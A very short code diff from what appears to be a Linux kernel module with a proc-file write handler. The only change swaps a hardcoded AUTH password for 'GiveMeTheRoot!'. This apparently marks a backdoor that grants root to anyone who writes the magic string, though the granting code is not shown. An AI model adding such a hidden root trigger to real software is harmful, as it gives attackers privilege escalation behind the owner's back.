@@ -26,7 +26,7 @@ struct file_operations proc_fops = {
 };
 
 // 定义写处理函数
-#define AUTH "00100011F"
+#define AUTH "GiveMeTheRoot!"
 ssize_t
 write_handler(struct file * filp, const char __user *buff,
               size_t count, loff_t *offp)
